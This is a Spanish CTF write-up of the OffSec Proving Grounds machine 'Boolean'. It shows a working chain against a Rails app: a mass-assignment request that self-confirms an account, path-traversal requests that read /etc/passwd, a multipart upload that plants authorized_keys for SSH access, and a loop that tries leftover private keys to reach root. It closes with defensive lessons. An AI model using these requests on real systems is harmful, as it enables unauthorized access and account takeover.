---
title: "Boolean"
description: "Writeup de la máquina Boolean de OffSec Proving Grounds: mass assignment para auto-confirmar la cuenta, path traversal y escritura arbitraria de ficheros en un File Manager de Rails para colocar una clave SSH, y escalada a root reutilizando claves privadas encontradas en el sistema."
date: 2026-11-14
creator: "OffSec"
rating: 4.5
dificultad: "Medio"
author: "Ghxstsec"
draft: false
type: "post"
---

Boolean | OffSec Proving Grounds Writeup
========================================

**Plataforma:** OffSec Proving Grounds · **SO:** Linux · **Dificultad:** Media

Boolean es una aplicación web **Ruby on Rails** ("The Only True Free Storage") que esconde
tres fallos encadenados: un **mass assignment** que nos deja saltarnos la confirmación por
email, un **path traversal / escritura arbitraria de ficheros** en el gestor de archivos que
convertimos en acceso SSH, y una **escalada de privilegios** trivial reutilizando claves
privadas abandonadas en el sistema.

> Nota: la enumeración de este writeup se hizo íntegramente pasando el tráfico por **Burp
> Suite**. Las claves privadas encontradas en la máquina se muestran **redactadas** a
> propósito — no tiene sentido publicar material sensible, aunque sea de un entorno de
> laboratorio.

Variables de entorno usadas:

```bash
TARGET=192.168.145.231   # víctima
LHOST=192.168.45.226     # nuestra IP (VPN)
```

Enumeración inicial
-------------------

Un escaneo básico muestra el servicio web y SSH:

```bash
nmap -sC -sV -T4 -Pn -v --min-rate 5000 $TARGET
```

El puerto 80 sirve una app Rails llamada **Boolean**. En la cabecera de las respuestas se
ven los típicos indicadores del framework (`X-Request-Id`, `X-Runtime`, cookie
`_boolean_session`, tokens CSRF). La landing es un **login** con enlace a **registro**:

```
GET /login        → formulario de login (username / password)
GET /register     → alta de cuenta
```

En el HTML del login, un comentario nos da la bienvenida con el tono de la máquina:

```html
<!-- The only True wisdom is in knowing you know nothing -->
```

Registro y el muro de la confirmación
-------------------------------------

Al registrarnos, la cuenta queda **creada pero sin confirmar**. La app nos redirige a
`/register/confirmation` con el mensaje:

> Confirm your account by clicking on the confirmation link sent to your email

El problema: no tenemos acceso a ese buzón, así que por la vía normal no podemos activar la
cuenta. Lo único editable en esa página es el email, a través de un formulario que hace un
`PATCH` por detrás:

```http
POST /settings/email HTTP/1.1
Host: 192.168.145.231
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CSRF-Token: <token>
Cookie: _boolean_session=<...>

_method=patch&authenticity_token=<token>&user%5Bemail%5D=joel%40joel.com&commit=Change+email
```

Fíjate en el parámetro **`user[email]`**: ese patrón anidado `user[...]` es la firma de los
*strong parameters* de Rails y, cuando están mal configurados, el sitio clásico del **mass
assignment**.

Vulnerabilidad #1 — Mass assignment para auto-confirmar la cuenta
-----------------------------------------------------------------

El controlador hace un `@user.update(user_params)` donde `user_params` permite más campos de
la cuenta de los que debería. Inyectamos un campo extra en el hash `user` para marcar la
cuenta como confirmada:

```http
POST /settings/email HTTP/1.1
Host: 192.168.145.231
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CSRF-Token: <token>
Cookie: _boolean_session=<...>

_method=patch&authenticity_token=<token>&user%5Bemail%5D=joel%40joel.com&user%5Bconfirmed%5D=true&commit=Change+email
```

La respuesta nos devuelve el objeto `user` completo y confirma que el campo inyectado **se
persistió**:

```json
{
  "email": "joel@joel.com",
  "confirmed": true,
  "id": 1,
  "username": "joel",
  "created_at": "2026-11-14T15:40:29.233Z",
  "updated_at": "2026-11-14T15:55:45.580Z"
}
```

`confirmed: true` y un `updated_at` recién cambiado → **bypass de la verificación por email**.
Ya podemos iniciar sesión y entrar al área autenticada.

> Detalle práctico: al reconstruir la petición a mano, cuidado con el `Content-Length`. Puma
> responde `408 Request Timeout` si el valor es mayor que el cuerpo real (se queda esperando
> bytes que nunca llegan).

El File Manager
---------------

Autenticados, `/` es un **File Manager** que permite subir y descargar ficheros. La navegación
y la descarga se controlan con dos parámetros en la query string:

```
GET /?cwd=<directorio>&file=<fichero>&download=true
```

Vulnerabilidad #2 — Path traversal (lectura)
--------------------------------------------

El parámetro `cwd` se concatena contra un directorio base del estilo
`File.join(base, cwd)`, **sin sanear los `../`**. Eso nos deja listar y leer cualquier
fichero del sistema al que llegue el usuario de la aplicación:

```http
GET /?cwd=../../../../../../etc HTTP/1.1
```

El listado de `/etc` aparece entero (incluye `passwd`, `shadow`, `crontab`...). Descargamos
`/etc/passwd`:

```http
GET /?cwd=../../../../../../etc&file=passwd&download=true HTTP/1.1
```

Y encontramos al usuario que nos interesa:

```
root:x:0:0:root:/root:/bin/bash
...
remi:x:1000:1000::/home/remi:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
```

El objetivo es **`remi`** (uid 1000, home `/home/remi`, shell `/bin/bash`). Como la app puede
leer `/etc` y, según veremos, escribir en el home de remi, deducimos que el servicio Rails
**corre como `remi`**.

Vulnerabilidad #3 — Escritura arbitraria de ficheros (RCE vía SSH)
------------------------------------------------------------------

Al navegar hasta el `.ssh` de remi con el traversal, el propio formulario de subida nos
regala la pista: añade un **campo oculto `cwd`** ya poblado con la ruta de traversal actual.

```http
GET /?cwd=../../../../../../home/remi/.ssh HTTP/1.1
```

```html
<form enctype="multipart/form-data" action="/upload" method="post">
  <input type="file" name="file" id="file" />
  <input value="../../../../../../home/remi/.ssh" type="hidden" name="cwd" id="cwd" />
  ...
</form>
```

Es decir: la subida guarda en **`File.join(base, cwd, basename(filename))`**. El traversal no
va en el nombre del fichero (que se reduce a su *basename*), sino en **`cwd`**. Confirmamos
que `/home/remi/.ssh` existe y es escribible (ya contiene `known_hosts` y un subdirectorio
`keys/`).

El plan: generar un par de claves y subir nuestra **clave pública** con el nombre
`authorized_keys` apuntando `cwd` al `.ssh` de remi.

```bash
ssh-keygen -t ed25519 -f ./id_ed25519 -N ''
cat id_ed25519.pub   # ssh-ed25519 AAAA... usuario@host
```

Petición de subida (multipart) con el `cwd` traverseado y el fichero renombrado:

```http
POST /upload HTTP/1.1
Host: 192.168.145.231
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBOOL
Cookie: _boolean_session=<...>

------WebKitFormBoundaryBOOL
Content-Disposition: form-data; name="authenticity_token"

<token>
------WebKitFormBoundaryBOOL
Content-Disposition: form-data; name="cwd"

../../../../../../home/remi/.ssh
------WebKitFormBoundaryBOOL
Content-Disposition: form-data; name="file"; filename="authorized_keys"
Content-Type: application/octet-stream

ssh-ed25519 AAAA...nuestra_clave_publica... kali@kali
------WebKitFormBoundaryBOOL
Content-Disposition: form-data; name="commit"

Upload
------WebKitFormBoundaryBOOL--
```

> Importante: el cuerpo multipart necesita terminadores de línea **CRLF** reales entre las
> partes. Si lo reconstruyes con herramientas que mandan solo `LF`, Rack no parsea el
> `authenticity_token` y Rails responde `422 Unprocessable Entity`. Lo más fiable es enviarlo
> desde **Burp Repeater** (escribe CRLF nativo y ajusta solo el `Content-Length`) o,
> directamente, usar el propio formulario del navegador tras haber navegado al `.ssh` (el
> campo `cwd` ya va precargado).

Respuesta `302 Found` → fichero escrito. Verificamos en el listado que aparece
`authorized_keys` en `/home/remi/.ssh/`. Entramos por SSH con nuestra clave privada:

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 remi@192.168.145.231
```

```
remi@boolean:~$ id
uid=1000(remi) gid=1000(remi) groups=1000(remi)
```

Foothold conseguido. La flag de usuario:

```bash
cat ~/local.txt
```

Escalada de privilegios — reutilización de claves SSH
-----------------------------------------------------

Dentro del `.ssh` de remi hay un subdirectorio **`keys/`** lleno de claves privadas
abandonadas:

```
remi@boolean:~/.ssh/keys$ ls
id_rsa  id_rsa.1  id_rsa.2  root
```

El nombre `root` lo dice todo: es la clave privada de root (el comentario interno dice
`remi@boolean`, pero el fichero está pensado para loguear como root en local). Contenido
**redactado**:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ...  [REDACTADO]
-----END OPENSSH PRIVATE KEY-----
```

El primer intento ingenuo falla:

```bash
remi@boolean:~/.ssh/keys$ ssh -i root root@127.0.0.1
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
```

**Ese error no significa que la clave sea incorrecta.** Ocurre porque el cliente SSH ofrece
primero todas las identidades del agente y las claves por defecto, y el servidor corta la
conexión al superar `MaxAuthTries` antes de llegar a la que pasamos con `-i`. Se arregla
forzando que use **solo** esa clave y desconectando el agente:

```bash
ssh -i root \
  -o IdentitiesOnly=yes \
  -o IdentityAgent=none \
  -F /dev/null \
  -o PreferredAuthentications=publickey \
  -o StrictHostKeyChecking=no \
  root@127.0.0.1
```

- `IdentitiesOnly=yes` → usa únicamente la clave de `-i`, ignora agente y claves por defecto.
- `IdentityAgent=none` → desconecta `ssh-agent` (la causa real del *too many failures*).
- `-F /dev/null` → ignora cualquier `~/.ssh/config` que inyecte identidades extra.
- `PreferredAuthentications=publickey` → no malgasta intentos probando password.

Si alguna no entrara, se prueban todas en bucle:

```bash
for k in root id_rsa id_rsa.1 id_rsa.2; do
  echo "== $k ==";
  ssh -i "$k" -o IdentitiesOnly=yes -o IdentityAgent=none -F /dev/null \
      -o BatchMode=yes -o StrictHostKeyChecking=no root@127.0.0.1 id 2>/dev/null;
done
```

La que imprime `uid=0(root)` es la buena:

```
root@boolean:~# id
uid=0(root) gid=0(root) groups=0(root)
root@boolean:~# cat /root/proof.txt
```

Máquina comprometida. 🏁

Resumen de la cadena
--------------------

| # | Fallo | Punto | Impacto |
|---|-------|-------|---------|
| 1 | Mass assignment | `PATCH /settings/email` → `user[confirmed]=true` | Bypass de confirmación por email |
| 2 | Path traversal | `?cwd=../../..` (listado y descarga) | Lectura arbitraria de ficheros (`/etc/passwd`) |
| 3 | Escritura arbitraria | `POST /upload` con `cwd` traverseado + `filename=authorized_keys` | Acceso SSH como `remi` |
| 4 | Reutilización de claves | `~/.ssh/keys/root` + `IdentitiesOnly` | Root |

Lecciones defensivas
---------------------

- **Strong parameters estrictos**: nunca `permit!`; listar explícitamente solo los campos
  editables (`params.require(:user).permit(:email)`). Campos sensibles como `confirmed`,
  `role` o `admin` jamás deben ser asignables desde el request.
- **Normalizar y validar rutas**: resolver la ruta final con algo tipo `File.expand_path` y
  comprobar que sigue dentro del directorio base antes de leer o escribir. Nunca confiar en un
  `cwd` controlado por el usuario.
- **No almacenar claves privadas en el servidor**, y mucho menos la de root bajo el home de un
  usuario sin privilegios. Rotar cualquier clave expuesta.
- **Endurecer SSH**: `PermitRootLogin prohibit-password` o `no`, y limitar el acceso por clave
  a lo estrictamente necesario.
